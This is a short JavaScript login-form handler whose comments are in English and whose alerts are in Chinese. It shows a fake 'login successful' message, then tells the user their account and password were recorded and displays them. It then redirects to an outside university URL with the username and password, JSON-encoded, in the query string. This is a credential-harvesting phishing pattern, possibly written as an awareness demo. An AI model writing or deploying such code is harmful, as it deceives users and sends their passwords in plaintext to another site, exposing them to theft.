document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("login").addEventListener("submit", function (event) {
        // Prevent the form from submitting
        event.preventDefault();

        // Get the username and password
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        // Check if username and password are empty
        if (username === "" || password === "") {
            // Show a prompt message
            alert("請輸入帳號和密碼");
            return; // Exit the function, don't proceed further
        }

        // Create a JavaScript object containing username and password
        var userData = {
            username: username,
            password: password
        };

        // Convert the JavaScript object to a JSON string
        var jsonData = JSON.stringify(userData);

        // Show a success alert dialog
        alert('登入成功!');

        // Show another prompt with a countdown before redirecting
        setTimeout(function () {
            // Build a success prompt message including username and password
            var successMessage = '已成功紀錄帳號密碼\n\n帳號：' + username + '\n密碼：' + password;
            alert(successMessage);
            // Redirect to the next page and pass JSON data as a query parameter
            window.location.href = 'https://www.fcu.edu.tw/?data=' + encodeURIComponent(jsonData);
        }, 2000); // Wait for 2 seconds before redirecting
    });
});

